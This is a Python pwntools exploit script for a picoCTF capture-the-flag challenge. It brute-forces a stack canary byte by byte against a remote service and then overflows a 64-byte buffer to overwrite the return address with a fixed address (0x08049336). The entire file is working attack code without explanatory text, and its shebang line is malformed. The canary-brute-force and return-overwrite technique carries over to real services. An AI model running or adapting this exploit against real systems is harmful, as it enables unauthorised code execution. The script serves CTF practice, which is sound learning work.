#!usr/bin/env/python3

from pwn import *


port = 59437
canary = ""

with context.quiet:
    for i in range(1, 5):
        for j in range(0, 255):
            p = remote("saturn.picoctf.net", port)
            # p = process("./vuln")
            p.sendlineafter(b"> ", str(64 + i).encode())
            p.sendlineafter(b"> ", ("A" * 64 + canary + chr(j)).encode())
            output = p.recvall()

            if b"Smashing" not in output:
                canary += chr(j)
                print(canary)
                break
canary = "BiRd"
p = remote("saturn.picoctf.net", port)
# p = process("./vuln")
print(canary)
p.sendlineafter(b"> ", str(200).encode())
p.sendlineafter(b"> ", ("A" * 64 + canary + "B" * 16).encode() + p32(0x08049336))
print(("A" * 64 + canary + "B" * 16).encode() + p32(0x08049336))
output = p.recvall()
print(output)
